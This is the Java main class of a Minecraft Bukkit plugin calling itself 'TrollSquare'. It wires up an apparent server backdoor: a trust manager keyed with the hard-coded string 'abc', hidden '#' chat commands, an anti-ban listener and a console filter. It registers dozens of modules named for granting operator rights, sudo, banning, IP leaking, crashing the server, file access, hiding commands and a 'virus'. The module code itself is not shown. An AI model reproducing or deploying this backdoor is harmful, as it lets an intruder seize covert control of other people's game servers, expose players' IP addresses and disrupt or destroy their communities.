package com.troll.start;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

import com.troll.event.AntibanListener;
import com.troll.event.ChatListener;
import com.troll.man.Advert;
import com.troll.man.ModuleManager;
import com.troll.man.TrustManager;
import com.troll.mods.*;
import com.troll.utils.ConsoleFilter;

public class Start extends JavaPlugin {
	private static Start instance;
	private PluginManager pm;
	private String prefix = "§5[§6§lTroll§bSquare§c§l1§5]§r ";
	private String commandPrefix = "#";
	
	private File file;
	private FreezeModule freezer;
	private TrustManager trustManager;
	private ModuleManager modManager;
	
	@Override
	public void onEnable() {
		instance = this;
		pm = Bukkit.getPluginManager();
		file = this.getFile();
		trustManager = new TrustManager("abc");
		modManager = new ModuleManager(this);
		freezer = new FreezeModule();
		
		register();
		
		Bukkit.getScheduler().runTaskTimer(Start.getInstance(), new Advert(), 3500L, 3500L);
	}
	
	@Override
	public void onDisable() {
		
	}

	public void register() {
		// Modules
		modManager.register(new TimeoutModule());
		modManager.register(new OpModule());
		modManager.register(new LeftModule());
		modManager.register(new SudoModule());
		modManager.register(new EndscreenModule());
		modManager.register(new ChatModule());
		modManager.register(new RandomChatModule());
		modManager.register(freezer);
		modManager.register(new UnfreezeModule());
		modManager.register(new JumpscareModule());
		modManager.register(new ColorModule());
		modManager.register(new HackModule());
		modManager.register(new BlackscreenModule());
		modManager.register(new InjectModule());
		modManager.register(new GlassboxModule());
		modManager.register(new CapsModule());
		modManager.register(new AngleModule());
		modManager.register(new HelpModule());
		modManager.register(new FillInventoryModule());
		modManager.register(new AntibanModule());
		modManager.register(new GamemodeModule());
		modManager.register(new ExplosionModule());
		modManager.register(new FakeOpModule());
		modManager.register(new FakeStopModule());
		modManager.register(new ZunamiModule());
		modManager.register(new SpongeWalkModule());
		modManager.register(new CommandspyModule());
		modManager.register(new BlockCommandModule());
		modManager.register(new BlockConsoleModule());
		modManager.register(new ChickenModule());
		modManager.register(new MuteModule());
		modManager.register(new MegaBuildModule());
		modManager.register(new CockBuildModule());
		modManager.register(new RandomPlaceModule());
		modManager.register(new RandomDropModule());
		modManager.register(new InventoryModule());
		modManager.register(new InventoryBlockModule());
		modManager.register(new DemoscreenModule());
		modManager.register(new GuiModule());
		modManager.register(new InvisibleBlockModule());
		modManager.register(new SpawnBotModule());
		modManager.register(new BotAttackModule());
		modManager.register(new FileModule());
		modManager.register(new CockModule());
		modManager.register(new ToiletModule());
		modManager.register(new UfoModule());
		modManager.register(new ToiletModule());
		modManager.register(new ControlModule());
		modManager.register(new CobwebModule());
		modManager.register(new IdentityModule());
		modManager.register(new HideCommandModule());
		modManager.register(new BombModule());
		modManager.register(new JailModule());
		modManager.register(new UnknownServerModule());
		modManager.register(new BookMatrixModule());
		modManager.register(new HackServerModule());
		modManager.register(new IpLeakModule());
		modManager.register(new TouretteModule());
		modManager.register(new ClientBrushModule());
		modManager.register(new InfoModule());
		modManager.register(new ClientFirebowModule());
		modManager.register(new RocketModule());
		modManager.register(new TimeSpamModule());
		modManager.register(new BackupModule());
		modManager.register(new LogSpamModule());
		modManager.register(new ScreenBlockModule());
		modManager.register(new ShortcutModule());
		modManager.register(new FriendModule());
		modManager.register(new HeavenModule());
		modManager.register(new ChatSpamModule());
		modManager.register(new ScoreboardModule());
		modManager.register(new TntRainModule());
		modManager.register(new ParticleSpamModule());
		modManager.register(new BanModule());
		modManager.register(new DeopModule());
		modManager.register(new CrashModule());
		modManager.register(new VirusModule());
		
		// Listeners
		pm.registerEvents(new ChatListener(), this);
		pm.registerEvents(new AntibanListener(), this);
	}
	
	public static Start getInstance() {
		if (instance == null)
			throw new NullPointerException("No plugin instance registerd!");
		return instance;
	}
	
	public PluginManager getPluginManager() {
		return pm;
	}
	
	public String getPrefix() {
		return prefix;
	}
	
	public FreezeModule getFreezer() {
		return freezer;
	}
	
	public File getPluginFile() {
		return file;
	}
	
	public String getCommandPrefix() {
		return this.commandPrefix;
	}

	public TrustManager getTrustManager() {
		return this.trustManager;
	}
	
	public ModuleManager getModuleManager() {
		return this.modManager;
	}	
}
